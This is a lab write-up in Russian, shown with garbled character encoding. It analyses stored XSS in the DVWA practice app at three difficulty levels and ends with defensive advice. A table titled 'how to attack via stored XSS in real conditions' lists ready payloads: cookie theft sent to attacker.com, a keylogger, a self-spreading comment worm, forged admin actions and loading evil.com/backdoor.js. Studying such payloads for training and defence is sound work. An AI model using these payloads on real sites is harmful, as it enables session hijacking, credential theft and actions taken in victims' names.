# üìò –ê–Ω–∞–ª–∏–∑ Stored XSS –≤ DVWA

---

## üí° –ß—Ç–æ —Ç–∞–∫–æ–µ Stored XSS?

**Stored (Persistent) XSS** ‚Äî —ç—Ç–æ –≤–Ω–µ–¥—Ä–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ JavaScript –≤ –ø–æ–ª—è –≤–≤–æ–¥–∞, –¥–∞–Ω–Ω—ã–µ –∏–∑ –∫–æ—Ç–æ—Ä—ã—Ö —Å–æ—Ö—Ä–∞–Ω—è—é—Ç—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ (–Ω–∞–ø—Ä–∏–º–µ—Ä, –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏, —Ñ–æ—Ä–º—ã, —Å–æ–æ–±—â–µ–Ω–∏—è). –ü—Ä–∏ –ø–æ—Å–ª–µ–¥—É—é—â–µ–º –ø—Ä–æ—Å–º–æ—Ç—Ä–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã –¥—Ä—É–≥–∏–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º —Å–∫—Ä–∏–ø—Ç **–∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∏—Å–ø–æ–ª–Ω—è–µ—Ç—Å—è**.

### ‚ùó –û–ø–∞—Å–Ω–µ–µ Reflected XSS, —Ç–∞–∫ –∫–∞–∫:

* –†–∞–±–æ—Ç–∞–µ—Ç **–±–µ–∑ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è** (–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø—Ä–æ—Å—Ç–æ –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç —Å—Ç—Ä–∞–Ω–∏—Ü—É).
* –ß–∞—Å—Ç–æ –≤—Å—Ç—Ä–µ—á–∞–µ—Ç—Å—è –≤ **—Ñ–æ—Ä—É–º–∞—Ö, —á–∞—Ç–∞—Ö, CMS, CRM**.
* –ú–æ–∂–µ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω—è—Ç—å—Å—è (–≤–∏—Ä—É—Å–æ–ø–æ–¥–æ–±–Ω–æ).

---

## üß™ –¢–µ—Å—Ç 1 ‚Äî –£—Ä–æ–≤–µ–Ω—å Low

**–í–≤–æ–¥**:

```html
Name: user  
Message: <script>alert(1)</script>
```

**–†–µ–∑—É–ª—å—Ç–∞—Ç**:
–ü—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã ‚Äî –ø–æ—è–≤–ª—è–µ—Ç—Å—è `alert(1)`.

### üîç –ü–æ—á–µ–º—É?

* –°–µ—Ä–≤–µ—Ä **–Ω–µ —Ñ–∏–ª—å—Ç—Ä—É–µ—Ç** –¥–∞–Ω–Ω—ã–µ.
* –í–≤–æ–¥ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è –≤ –±–∞–∑–µ –∏ **–æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç—Å—è –∫–∞–∫ –µ—Å—Ç—å** –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã:

  ```html
  <div class="comment">user says: <script>alert(1)</script></div>
  ```

---

## üß™ –¢–µ—Å—Ç 2 ‚Äî –£—Ä–æ–≤–µ–Ω—å Medium

**–û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ**:
–ü–æ–ª–µ `name` ‚Äî –¥–ª–∏–Ω–∞ 10 —Å–∏–º–≤–æ–ª–æ–≤.
–¢—ã **—É–≤–µ–ª–∏—á–∏–ª –ª–∏–º–∏—Ç –¥–æ 50 —Å–∏–º–≤–æ–ª–æ–≤** (–Ω–∞–ø—Ä–∏–º–µ—Ä, –∏–∑–º–µ–Ω–∏–≤ HTML —á–µ—Ä–µ–∑ DevTools).

**–í–≤–æ–¥**:

```html
<ScRiPt>alert(document.cookie)</ScRiPt>
```

**–†–µ–∑—É–ª—å—Ç–∞—Ç**:
–°–∫—Ä–∏–ø—Ç –∏—Å–ø–æ–ª–Ω—è–µ—Ç—Å—è, –∏ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç—Å—è –∫—É–∫–∞:

```
PHPSESSID=...; language=en; ...
```

### üîç –ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç?

* –ù–∞ —É—Ä–æ–≤–Ω–µ Medium –µ—Å—Ç—å **–æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –ø–æ –¥–ª–∏–Ω–µ**, –Ω–æ –Ω–µ—Ç **—Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏–∏ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ** –∏–ª–∏ —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è.
* –° –ø–æ–º–æ—â—å—é DevTools —Ç—ã –æ–±–æ—à—ë–ª –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ, –∏ —Å–∫—Ä–∏–ø—Ç —É—Å–ø–µ—à–Ω–æ —Å–æ—Ö—Ä–∞–Ω–∏–ª—Å—è.
* –ö–∞–∂–¥—ã–π, –∫—Ç–æ –∑–∞–π–¥—ë—Ç –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É ‚Äî –≤—ã–ø–æ–ª–Ω–∏—Ç —ç—Ç–æ—Ç JS.

---

## üß™ –¢–µ—Å—Ç 3 ‚Äî –£—Ä–æ–≤–µ–Ω—å High

**–í–≤–æ–¥**:

```html
<img src=123.png onerror="alert(document.cookie)">
```

**–†–µ–∑—É–ª—å—Ç–∞—Ç**:
–ü–æ–∫–∞–∑—ã–≤–∞–µ—Ç `document.cookie` —Å–Ω–æ–≤–∞.

### üîç –ü–æ—á–µ–º—É —Å—Ä–∞–±–æ—Ç–∞–ª–æ?

* –§–∏–ª—å—Ç—Ä–∞—Ü–∏—è –Ω–∞ High –ø—ã—Ç–∞–µ—Ç—Å—è —É–¥–∞–ª—è—Ç—å `<script>` –∏–ª–∏ —Ñ–∏–ª—å—Ç—Ä–æ–≤–∞—Ç—å –∫–ª—é—á–µ–≤—ã–µ —Å–ª–æ–≤–∞.
* –ù–æ `<img onerror>` ‚Äî —ç—Ç–æ **–æ–±—Ö–æ–¥**, –≤–µ–¥—å `img` –≤—ã–≥–ª—è–¥–∏—Ç –±–µ–∑–æ–±–∏–¥–Ω–æ, –∞ `onerror` ‚Äî —Å–æ–±—ã—Ç–∏–µ, –∫–æ—Ç–æ—Ä–æ–µ —Å–ª–æ–∂–Ω–æ —Ñ–∏–ª—å—Ç—Ä–æ–≤–∞—Ç—å –Ω–∞ —Å—Ç–æ—Ä–æ–Ω–µ —Å–µ—Ä–≤–µ—Ä–∞.
* –í–≤–æ–¥ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è –∏ –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç—Å—è –∫–∞–∫:

  ```html
  <div class="comment">user says: <img src=123.png onerror="alert(document.cookie)"></div>
  ```

---

## üéØ –ö–∞–∫ –∞—Ç–∞–∫–æ–≤–∞—Ç—å —á–µ—Ä–µ–∑ Stored XSS –≤ —Ä–µ–∞–ª—å–Ω—ã—Ö —É—Å–ª–æ–≤–∏—è—Ö?

| –¶–µ–ª—å                                 | –ü—Ä–∏–º–µ—Ä –∫–æ–¥–∞                                                                       | –ß—Ç–æ –ø—Ä–æ–∏–∑–æ–π–¥—ë—Ç                 |
| ------------------------------------ | --------------------------------------------------------------------------------- | ------------------------------ |
| –ü–æ—Ö–∏—â–µ–Ω–∏–µ —Å–µ—Å—Å–∏–∏                     | `<script>fetch('https://attacker.com?c='+document.cookie)</script>`               | –ö—É–∫–∞ –æ—Ç–ø—Ä–∞–≤–∏—Ç—Å—è –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫—É |
| –ó–ª–æ –≤ iframe                         | `<iframe src="http://malicious.com/"></iframe>`                                   | –í—Å—Ç—Ä–∞–∏–≤–∞–Ω–∏–µ —Ñ–∏—à–∏–Ω–≥–∞            |
| –ö–ª–∞–≤–∏–∞—Ç—É—Ä–Ω—ã–π —à–ø–∏–æ–Ω                   | `<script>document.onkeypress=(e)=>fetch('http://x/log?'+e.key)</script>`          | –õ–æ–≥–≥–µ—Ä –Ω–∞–∂–∞—Ç–∏–π                 |
| –°–∞–º–æ—Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω–µ–Ω–∏–µ (–≤ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏—è—Ö) | `<script>fetch('/comment',{method:'POST', body:'<script>...</script>'})</script>` | XSS-—á–µ—Ä–≤—å                      |
| –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –¥–µ–π—Å—Ç–≤–∏–π –æ—Ç –∏–º–µ–Ω–∏ –∂–µ—Ä—Ç–≤—ã  | `<script>fetch('/admin/delete-user?id=5')</script>`                               | CSRF + XSS                     |
| –ü—Ä–æ–∫—Å–∏—Ä–æ–≤–∞–Ω–∏–µ –≤ —Å–≤–æ–π JS              | `<script src="https://evil.com/backdoor.js"></script>`                            | –ó–∞–≥—Ä—É–∂–∞–µ—Ç —É–¥–∞–ª—ë–Ω–Ω—ã–π –∫–æ–¥        |

---

## üõ°Ô∏è –ö–∞–∫ –∑–∞—â–∏—â–∞—Ç—å—Å—è (–¥–ª—è —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤)

* **–≠–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ (`escaping`)** –≤—ã–≤–æ–¥–∞ (`htmlspecialchars` –∏–ª–∏ –∞–Ω–∞–ª–æ–≥).
* –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ **Content Security Policy (CSP)**.
* –ó–∞–ø—Ä–µ—Ç inline-—Å–∫—Ä–∏–ø—Ç–æ–≤ (`nonce`).
* –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–≤–æ–¥–∞ (white-list, –Ω–æ –Ω–µ black-list).
* –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ñ—Ä–µ–π–º–≤–æ—Ä–∫–æ–≤ —Å –∑–∞—â–∏—Ç–æ–π (`React`, `Angular`, `Vue` –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é —ç–∫—Ä–∞–Ω–∏—Ä—É—é—Ç –≤–≤–æ–¥).

---

## üìã –ö—Ä–∞—Ç–∫–æ–µ —Å—Ä–∞–≤–Ω–µ–Ω–∏–µ Reflected vs Stored XSS

| –ö—Ä–∏—Ç–µ—Ä–∏–π          | Reflected XSS          | Stored XSS            |
| ----------------- | ---------------------- | --------------------- |
| –ì–¥–µ —Å–æ–¥–µ—Ä–∂–∏—Ç—Å—è?   | –í URL, –Ω–µ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è  | –í –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö         |
| –ö–æ–≥–¥–∞ —Å—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç | –ü—Ä–∏ –ø–µ—Ä–µ—Ö–æ–¥–µ –ø–æ —Å—Å—ã–ª–∫–µ | –ü—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã |
| –¢—Ä–µ–±—É–µ—Ç—Å—è –∂–µ—Ä—Ç–≤–∞? | –î–∞, –ø–µ—Ä–µ–π—Ç–∏ –ø–æ —Å—Å—ã–ª–∫–µ  | –ù–µ—Ç, –ø—Ä–æ—Å—Ç–æ –∑–∞–≥—Ä—É–∑–∫–∞  |
| –°–ª–æ–∂–Ω–æ—Å—Ç—å –∞—Ç–∞–∫–∏   | –ù–∏–∂–µ                   | –í—ã—à–µ                  |
| –û–ø–∞—Å–Ω–æ—Å—Ç—å         | –í—ã—Å–æ–∫–∞—è                | –û—á–µ–Ω—å –≤—ã—Å–æ–∫–∞—è         |

